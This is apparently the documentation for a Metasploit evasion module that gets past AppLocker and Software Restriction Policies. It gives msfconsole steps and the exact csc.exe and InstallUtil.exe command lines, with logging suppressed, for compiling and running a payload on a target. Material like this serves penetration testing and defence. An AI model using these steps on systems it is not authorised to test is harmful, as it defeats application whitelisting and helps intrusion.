## Intro

This module is designed to evade solutions such as software restriction policies and Applocker. 
Applocker in its default configuration will block code in the form of executables (.exe and .com, .msi), scripts (.ps1, .vbs, .js) and dll's from running in user controlled directories.
It enforces this by employing whitelisting, in that code can only be run from the protected directories and sub directories of "Program Files" and "Windows" 
The main vector for this bypass is to use the trusted binary InstallUtil.exe which is located within the trusted Windows directory and also has the ability to execute user supplied code.

## Vulnerable Application

This evasion will work on all versions of Windows that include .NET versions 3.5 or greater that has solutions such as Applocker or Software Restriction Policies active.

## Options

- **FILENAME** - Filename for the evasive file (default: install_util.txt).

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use evasion/windows/applocker_evasion_install_util`
  3. Do: `set PAYLOAD <payload>`
  4. Do: `run`
  5. The module will now display instructions of how to proceed:
     `[+] install_util.txt stored at /root/.msf4/local/install_util.txt`
     `[*] Copy install_util.txt to the target`
     `[*] Compile using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\csc.exe /out:installutil.exe install_util.txt` - replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").
     `[*] Execute using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\InstallUtil.exe /logfile= /LogToConsole=false /U installutil.exe` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").

## References

https://attack.mitre.org/techniques/T1118/
